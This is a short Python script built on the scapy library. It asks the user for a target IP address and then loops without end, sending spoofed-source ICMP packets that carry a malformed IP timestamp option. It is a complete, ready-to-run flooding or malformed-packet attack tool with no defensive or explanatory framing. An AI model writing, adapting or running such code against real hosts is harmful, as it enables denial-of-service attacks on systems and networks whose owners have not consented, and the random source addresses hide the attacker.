import scapy.all as scapy
import os


def IP_TimeStamp():

	clear = os.system('clear')

	print("**************************************")
	print("            IP_TimeStamp")
	print("**************************************")

	print("Please input your target's IP ")
	target = input("[IP_TimeStamp]# ")
	src_ip =scapy.RandIP()
	num = 0
	try:
		while True:
			packet = scapy.IP(src=src_ip,dst=target,options=[scapy.IPOption(optclass='debug',length=36,option='timestamp',value=b'\x05\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'),scapy.IPOption_EOL(),scapy.IPOption_EOL(),scapy.IPOption_EOL(),scapy.IPOption_EOL()])/scapy.ICMP()/scapy.Raw(load=b'abcdefghijklmnopqrstuvwabcdefghi')

			scapy.send(packet,verbose=False)
			num += 1
			print("sent"+str(num)+"packets")
	except KeyboardInterrupt:
		print("quit")
	
IP_TimeStamp()